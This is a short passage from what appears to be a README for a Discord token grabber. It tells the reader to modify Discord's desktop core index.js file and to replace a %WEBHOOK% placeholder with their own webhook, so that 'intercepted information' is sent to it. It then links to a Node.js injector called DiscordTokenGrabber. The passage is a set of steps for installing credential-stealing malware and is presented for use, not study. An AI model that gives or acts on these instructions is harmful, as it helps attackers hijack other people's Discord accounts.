    ```
    %APPDATA%\Local\Discord\app-<app-version>\modules\discord_desktop_core-<core-version>\discord_desktop_core\index.js
    ```

3. Replace `%WEBHOOK%` with your Discord webhook. The intercepted information will be sent to this webhook.
4. Restart Discord

# Mode
- If you want to use the **injector** based on Nodejs and with many features, enter [here](https://github.com/k4itrun/DiscordTokenGrabber) it is free
